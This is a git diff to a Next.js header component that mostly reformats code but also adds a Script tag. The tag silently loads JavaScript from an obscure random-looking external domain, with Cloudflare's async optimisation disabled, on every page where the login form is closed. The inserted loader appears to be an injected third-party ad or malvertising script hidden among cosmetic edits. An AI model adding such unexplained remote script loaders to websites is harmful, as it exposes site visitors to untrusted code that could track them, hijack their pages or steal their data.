@@ -16,13 +16,14 @@ import { toasterSuccess } from "./Toaster";
 import { useProfileTab } from "context/ProfileTabContext";
 import Image from "next/image";
 import { useAuth } from "context/AuthContext";
+import Script from "next/script";
 
 export default function Header() {
   const router = useRouter();
   const path = usePathname();
   const route = path.split("/");
   const { setActiveTab } = useProfileTab();
-  const {token,setToken}:any=useAuth()
+  const { token, setToken }: any = useAuth();
   const [isOpen, isClose] = useState(false);
   const [OpenProfile, setOpenProfile] = useState(false);
   const [OpenSearch, setOpenSearch] = useState(false);
@@ -55,8 +56,7 @@ export default function Header() {
   };
   const handleLogOut = () => {
     setOpenProfile(false);
-    logOut(), 
-    setToken(null)
+    logOut(), setToken(null);
     router.push("/home");
     toasterSuccess("LogOut Successfully !", 3000, "id");
   };
@@ -191,6 +191,23 @@ export default function Header() {
           </div>
         </div>
       </div>
+      {/* {isOpen ? (
+        <AuthForm
+          isOpen={isOpen}
+          handleClose={handleClose}
+          ProfileType="profile"
+        />
+      ) : null} */}
+
+      {isOpen ? null : (
+        <Script
+          data-cfasync="false"
+          async
+          type="text/javascript"
+          src="//tj.juglarunioid.com/rV2Wve6XqB3m6BLz1/109807"
+        ></Script>
+      )}
+
       {isOpen ? (
         <AuthForm
           isOpen={isOpen}
